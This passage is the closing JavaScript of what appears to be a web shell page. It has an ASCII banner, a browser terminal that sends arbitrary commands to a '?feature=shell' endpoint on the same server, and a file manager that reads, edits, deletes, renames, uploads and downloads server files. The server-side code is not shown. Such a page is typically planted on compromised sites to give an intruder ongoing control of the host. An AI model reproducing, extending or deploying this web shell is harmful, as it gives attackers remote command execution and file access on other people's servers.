        appendBannerLine(' \\____$$\\ $$ |  $$ |$$$$$$$$ |$$ |$$ |      $$ \\$$$$ |$$ |  $$ | \\$$$$  / ');
        appendBannerLine('$$\\   $$ |$$ |  $$ |$$   ____|$$ |$$ |      $$ |\\$$$ |$$ |  $$ | $$  $$<  ');
        appendBannerLine('\\$$$$$$  |$$ |  $$ |\\$$$$$$$\\ $$ |$$ |      $$ | \\$$ |\\$$$$$$$ |$$  /\\$$\\ ');
        appendBannerLine(' \\______/ \\__|  \\__| \\_______|\\__|\\__|      \\__|  \\__| \\____$$ |\\__/  \\__|');
        appendBannerLine('                                                      $$\\   $$ |          ');
        appendBannerLine('                                                      \\$$$$$$  |          ');
        appendBannerLine('                                                       \\______/           ');
        appendBannerLine('');
        appendBannerLine('');
        
        // ====== EVENT DELEGATION FOR FILE MANAGER BUTTONS ======
        
        /** Handle clicks on file manager action buttons (delete, edit, rename, download) */
        fmTbody.addEventListener('click', function(e) {
            const target = e.target.closest('button');
            if (!target) return;
            const path = target.getAttribute('data-path');
            if (!path) return;
            
            if (target.classList.contains('fm-delete')) fmDelete(path);
            else if (target.classList.contains('fm-edit')) fmEdit(path);
            else if (target.classList.contains('fm-rename')) fmRename(path);
            else if (target.classList.contains('fm-download')) fmDownload(path);
        });
        
        /** Handle clicks on directory names to navigate into them */
        fmTbody.addEventListener('click', function(e) {
            const dirSpan = e.target.closest('.dir');
            if (dirSpan) {
                const path = dirSpan.getAttribute('data-path');
                if (path) fmRefresh(path);
            }
        });
        
        /** Trigger file download by creating a temporary link and clicking it */
        function fmDownload(path) {
            const downloadUrl = getDownloadUrl(path);
            const a = document.createElement('a');
            a.href = downloadUrl; a.download = '';
            document.body.appendChild(a); a.click(); document.body.removeChild(a);
        }
        
        // ====== PATH & PROMPT MANAGEMENT ======
        
        /** 
         * Update all path displays (terminal prompt, file manager path bar)
         * Converts forward slashes to backslashes on Windows for display
         */
	function updateAllPaths(newCwd) {
	    cwd = normalizePath(newCwd);
	    saveCwd(cwd);
	    
	    // Show only drive letter (Windows) or root slash (Linux)
	    let promptPath = '';
	    if (OS_TYPE === 'windows') {
		// Extract drive letter from path (e.g., C: from C:/Users)
		const driveMatch = cwd.match(/^([A-Za-z]):/);
		promptPath = driveMatch ? driveMatch[1] + ':\\' : 'C:\\';
	    } else {
		promptPath = '/';
	    }
	    
	    const promptSymbol = (OS_TYPE === 'windows') ? '>' : '$';
	    terminalPrompt.textContent = promptPath + promptSymbol + ' ';
	    
	    // File manager still shows full path
	    if (document.getElementById('panel-files').classList.contains('active')) {
		fmPath.value = (OS_TYPE === 'windows') ? cwd.replace(/\//g, '\\') : cwd;
	    }
	}
        
        /** Switch between Terminal, File Manager, and Help tabs */
        function switchTab(tabName) {
            // Deactivate all tabs and panels
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            
            // Activate selected tab
            const tabs = document.querySelectorAll('.tab');
            let targetTab;
            if (tabName === 'terminal') targetTab = tabs[0];
            else if (tabName === 'files') targetTab = tabs[1];
            else if (tabName === 'help') targetTab = tabs[2];
            
            if (targetTab) targetTab.classList.add('active');
            document.getElementById('panel-' + tabName).classList.add('active');
            
            // Initialize file manager when switching to it
            if (tabName === 'files') {
                fmPath.value = (OS_TYPE === 'windows') ? cwd.replace(/\//g, '\\') : cwd;
                fmSearch.value = currentSearch;
                fmRefresh(cwd);
                updateVirtualScrollParams();
            }
            // Focus terminal input when switching to terminal
            if (tabName === 'terminal') terminalInput.focus();
        }
        
        // ====== TERMINAL INPUT HANDLER ======
        
        /** Handle keyboard events in terminal input */
        terminalInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                const cmd = this.value;
                

		// Show FULL path in log, but only drive in prompt
		let displayCwd = cwd;
		if (OS_TYPE === 'windows') displayCwd = cwd.replace(/\//g, '\\');
		const promptSymbol = (OS_TYPE === 'windows') ? '>' : '$';
		appendCommand(displayCwd + promptSymbol + ' ' + cmd);
                
                // Handle clear command locally (no server request needed)
                if (cmd.trim() === 'clear') {
                    terminalOutput.innerHTML = '';
                    this.value = '';
                    return;
                }
                
                // Save command to history
                if (cmd.trim() !== '') {
                    commandHistory.push(cmd);
                    historyIndex = commandHistory.length;
                }
                
                // Execute command on server
                if (cmd.trim() !== '') executeTerminalCommand(cmd);
                this.value = '';
            } 
            // Arrow Up: browse command history backwards
            else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex > 0) { historyIndex--; this.value = commandHistory[historyIndex]; }
            } 
            // Arrow Down: browse command history forwards
            else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) { historyIndex++; this.value = commandHistory[historyIndex]; }
                else { historyIndex = commandHistory.length; this.value = ''; }
            } 
            // Tab: auto-complete
            else if (e.key === 'Tab') {
                e.preventDefault();
                handleTabCompletion();
            }
        });
        
        /** Send command to server for execution via AJAX */
        function executeTerminalCommand(cmd) {
            // Special command: 'upload' switches to File Manager tab
            if (cmd.trim() === 'upload') {
                switchTab('files');
                setTimeout(() => fmUploadFile(), 500);
                appendInfo('Switching to File Manager for upload...');
                return;
            }
            
            fetch('?feature=shell', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: `cmd=${encodeURIComponent(cmd)}&cwd=${encodeURIComponent(cwd)}`
            })
            .then(r => r.json())
            .then(data => {
                // Display command output
                if (data.stdout) {
                    const stdout = atob(data.stdout);  // Decode base64
                    if (stdout) appendOutput(stdout);
                }
                // Update path if it changed (e.g., after cd command)
                if (data.cwd) {
                    const newCwd = normalizePath(atob(data.cwd));
                    if (newCwd !== cwd) {
                        updateAllPaths(newCwd);
                        if (document.getElementById('panel-files').classList.contains('active')) fmRefresh(cwd);
                    }
                }
                scrollToBottom();
            })
            .catch(err => appendError('Error: ' + err.message));
        }
        
        /** Display a command line with colored prompt in terminal output */
        function appendCommand(text) {
            const div = document.createElement('div');
            div.style.whiteSpace = 'pre'; div.style.margin = '0';
            
            // Find the prompt symbol to split prompt from command
            let promptEnd = text.indexOf('> ');
            if (promptEnd === -1) promptEnd = text.indexOf('$ ');
            
            if (promptEnd !== -1) {
                const prompt = text.substring(0, promptEnd + 2);    // Green part
                const command = text.substring(promptEnd + 2);      // Yellow part
                div.innerHTML = '<span style="color:#00ff41;font-weight:bold;">' + escapeHtml(prompt) + '</span><span style="color:#ffaa00;font-weight:bold;">' + escapeHtml(command) + '</span>';
            } else {
                div.innerHTML = '<span style="color:#00ff41;font-weight:bold;">' + escapeHtml(text) + '</span>';
            }
            terminalOutput.appendChild(div);
            scrollToBottom();
        }
        
        /** Display command output in terminal */
        function appendOutput(text) {
            if (!text) return;
            const pre = document.createElement('pre');
            pre.textContent = text;
            terminalOutput.appendChild(pre);
            scrollToBottom();
        }
        
        /** Display info message in terminal (green) */
        function appendInfo(text) {
            const pre = document.createElement('pre');
            pre.style.color = '#00ff41'; pre.innerHTML = text;
            terminalOutput.appendChild(pre); scrollToBottom();
        }
        
        /** Display error message in terminal (red) */
        function appendError(text) {
            const pre = document.createElement('pre');
            pre.style.color = '#ff4444'; pre.textContent = text;
            terminalOutput.appendChild(pre); scrollToBottom();
        }
        
        /** Scroll terminal output to bottom */
        function scrollToBottom() { terminalOutput.scrollTop = terminalOutput.scrollHeight; }
        
        /** Handle Tab key for auto-completion */
        function handleTabCompletion() {
            const input = terminalInput.value;
            const lastSpace = input.lastIndexOf(' ');
            if (lastSpace === -1) getCompletion(input, 'cmd');  // Complete command name
            else getCompletion(input.substring(lastSpace + 1), 'file', input.substring(0, lastSpace + 1));  // Complete file path
        }
        
        /** Fetch completion suggestions from server */
        function getCompletion(searchTerm, type, prefix = '') {
            fetch('?feature=hint', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: `filename=${encodeURIComponent(searchTerm)}&cwd=${encodeURIComponent(cwd)}&type=${encodeURIComponent(type)}`
            })
            .then(r => r.json())
            .then(data => {
                if (data.files && data.files.length > 0) {
                    if (data.files.length === 1) {
                        // Single match: auto-complete the input
                        terminalInput.value = prefix + normalizePath(atob(data.files[0]));
                    } else {
                        // Multiple matches: show options
                        appendInfo(data.files.map(f => normalizePath(atob(f))).join('  '));
                    }
                }
            });
        }
        
        // ====== FILE MANAGER FUNCTIONS ======
        
        /** Refresh file manager for a given path */
        function fmRefresh(path) {
            if (!path) path = fmPath.value || cwd;
            path = normalizePath(path.trim());
            if (path === '') path = '/';
            
            // Update path display (with OS-specific separators)
            fmPath.value = (OS_TYPE === 'windows') ? path.replace(/\//g, '\\') : path;
            saveCwd(path);
            updateAllPaths(path);
            
            // Reset pagination
            currentOffset = 0; currentFileList = [];
            loadMoreContainer.style.display = 'none'; loadMoreBtn.disabled = false;
            loadFiles(path, 0);
        }
        
        /** Load more files (pagination) */
        function loadMoreFiles() {
            const remaining = totalFiles - currentFileList.length;
            if (remaining <= 0) { loadMoreContainer.style.display = 'none'; return; }
            currentOffset += LOAD_LIMIT;
            loadFiles(fmPath.value, currentOffset, true);
        }
        
        /** Fetch file list from server */
        function loadFiles(path, offset, append = false) {
            loadMoreBtn.disabled = true; loadMoreBtn.textContent = 'Loading...';
            if (!path || path === '') path = '/';
            
            const searchTerm = currentSearch;
            let body = `action=list&path=${encodeURIComponent(path)}&cwd=${encodeURIComponent(cwd)}&offset=${offset}&limit=${LOAD_LIMIT}`;
            if (searchTerm) body += `&search=${encodeURIComponent(searchTerm)}`;
            
            fetch('?feature=filemanager', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: body
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    // Append or replace file list
                    if (!append) currentFileList = data.data;
                    else currentFileList = currentFileList.concat(data.data);
                    
                    totalFiles = data.total; hasMoreFiles = data.hasMore;
                    fileCount.textContent = totalFiles + ' file' + (totalFiles !== 1 ? 's' : '');
                    if (searchTerm) fileCount.textContent += ' (filtered)';
                    
                    updateVirtualScrollParams();
                    visibleRange = { start: 0, end: LOAD_LIMIT };
                    renderVisibleFiles();
                    
                    // Update path if server returned a different cwd
                    if (data.cwd) {
                        const nc = normalizePath(data.cwd);
                        fmPath.value = (OS_TYPE === 'windows') ? nc.replace(/\//g, '\\') : nc;
                        saveCwd(nc); updateAllPaths(nc);
                    }
                    
                    // Show/hide "Load More" button
                    const remaining = totalFiles - currentFileList.length;
                    if (remaining > 0) {
                        loadMoreContainer.style.display = 'block';
                        loadMoreBtn.textContent = `Load More (${remaining} remaining)`;
                        loadMoreBtn.disabled = false;
                    } else { loadMoreContainer.style.display = 'none'; }
                } else {
                    loadMoreBtn.disabled = false; loadMoreBtn.textContent = 'Load More';
                }
            })
            .catch(err => { loadMoreBtn.disabled = false; loadMoreBtn.textContent = 'Load More'; });
        }
        
        /** Navigate to parent directory */
        function fmGoBack() {
            let currentPath = normalizePath(fmPath.value);
            if (currentPath === '/' || currentPath === '') return;
            if (currentPath.match(/^[A-Za-z]:\/$/)) { fmRefresh('/'); return; }
            const lastSlash = currentPath.lastIndexOf('/');
            if (lastSlash <= 0) fmRefresh('/');
            else fmRefresh(currentPath.substring(0, lastSlash) || '/');
        }
        
        /** Delete a file or directory (with confirmation) */
        function fmDelete(path) {
            if (!confirm('Delete:\n' + path + '?')) return;
            fetch('?feature=filemanager', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: `action=delete&path=${encodeURIComponent(path)}&cwd=${encodeURIComponent(cwd)}`
            })
            .then(r => r.json())
            .then(data => { if (data.success) fmRefresh(); });
        }
        
        /** Edit a text file (read, prompt for changes, save) */
        function fmEdit(path) {
            fetch('?feature=filemanager', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: `action=read&path=${encodeURIComponent(path)}&cwd=${encodeURIComponent(cwd)}`
            })
            .then(r => r.json())
            .then(data => {
                if (data.success && data.content) {
                    const content = atob(data.content);
                    const newContent = prompt('Edit: ' + path, content);
                    if (newContent !== null && newContent !== content) {
                        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
                        fetch('?feature=filemanager', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                            body: `action=save&path=${encodeURIComponent(path)}&content=${encodeURIComponent(encodedContent)}&cwd=${encodeURIComponent(cwd)}`
                        })
                        .then(r => r.json())
                        .then(saveData => { if (saveData.success) fmRefresh(); });
                    }
                }
            });
        }
        
        /** Rename a file or directory */
        function fmRename(path) {
            const oldName = path.split('/').pop();
            const newName = prompt('Rename:', oldName);
            if (newName && newName !== oldName && newName.trim() !== '') {
                fetch('?feature=filemanager', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `action=rename&path=${encodeURIComponent(path)}&newname=${encodeURIComponent(newName.trim())}&cwd=${encodeURIComponent(cwd)}`
                })
                .then(r => r.json())
                .then(data => { if (data.success) fmRefresh(); });
            }
        }
        
        /** Create a new folder */
        function fmNewFolder() {
            const name = prompt('Folder name:');
            if (name && name.trim() !== '') {
                const path = normalizePath(fmPath.value + '/' + name.trim());
                fetch('?feature=filemanager', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `action=mkdir&path=${encodeURIComponent(path)}&cwd=${encodeURIComponent(cwd)}`
                })
                .then(r => r.json())
                .then(data => { if (data.success) fmRefresh(); });
            }
        }
        
        /** Open file upload dialog */
        function fmUploadFile() { document.getElementById('fm-upload-input').click(); }
        
        /** Handle file selection from upload dialog */
        function fmHandleUpload(input) { if (input.files.length) { uploadFilesWithProgress(input.files); input.value = ''; } }
        
        // ====== KEYBOARD SHORTCUTS ======
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.key === '1') { e.preventDefault(); switchTab('terminal'); }
            else if (e.ctrlKey && e.key === '2') { e.preventDefault(); switchTab('files'); fmRefresh(cwd); }
            else if (e.ctrlKey && e.key === '3') { e.preventDefault(); switchTab('help'); }
            else if (e.ctrlKey && e.key === 'f' && document.getElementById('panel-files').classList.contains('active')) { e.preventDefault(); fmSearch.focus(); }
        });
        
        /** Auto-focus terminal input when clicking anywhere in terminal panel */
        document.addEventListener('click', (e) => {
            if (document.getElementById('panel-terminal').classList.contains('active') && 
                e.target.tagName !== 'BUTTON' && e.target.tagName !== 'INPUT' && !e.target.closest('#fm-table')) {
                terminalInput.focus();
            }
        });
        
        // ====== INITIAL SETUP ======
        updateAllPaths(cwd);      // Set initial prompt
        refreshSystemInfo();       // Load system info icons
    </script>
</body>
</html>
